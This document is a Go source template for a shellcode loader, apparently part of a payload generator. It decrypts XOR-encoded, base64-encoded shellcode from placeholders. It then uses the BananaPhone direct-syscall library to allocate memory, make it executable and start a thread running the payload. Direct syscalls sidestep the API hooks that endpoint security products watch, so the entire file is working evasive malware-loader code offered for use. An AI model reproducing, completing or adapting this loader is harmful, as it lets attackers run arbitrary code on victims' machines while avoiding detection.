package main

import (
	"encoding/base64"
	"syscall"
	"unsafe"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	_ "fmt"
	_ "math"
	_ "os"
)

const (
	thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
	memCommit  = uintptr(0x00001000)
	memreserve = uintptr(0x00002000)
)

var (
	key                = "{{ .Key }}"
)

func encodeString(s string) (res string) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res += string(tmp[i] ^ x[i%len(x)])
	}
	return
}

func encodeByteArray(s string) (res []byte) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res = append(res, tmp[i]^x[i%len(x)])
	}
	return
}

func main() {
	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
	n := {{ .Size }}

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		panic(err)
	}
	alloc, err := bp.GetSysID("NtAllocateVirtualMemory")
	if err != nil {
		panic(err)
	}
	protect, err := bp.GetSysID("NtProtectVirtualMemory")
	if err != nil {
		panic(err)
	}
	createthread, err := bp.GetSysID("NtCreateThreadEx")
	if err != nil {
		panic(err)
	}

	handle := uintptr(0xffffffffffffffff)
	var baseA uintptr
	regionsize := uintptr(n)
	r1, r := bananaphone.Syscall(
		alloc, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		panic(r)
	}
	//write memory
	bananaphone.WriteMemory(sc, baseA)

	var oldprotect uintptr
	r1, r = bananaphone.Syscall(
		protect, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		panic(r)
	}
	var hhosthread uintptr
	r1, r = bananaphone.Syscall(
		createthread,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		panic(r)
	}
	_ = r1
}
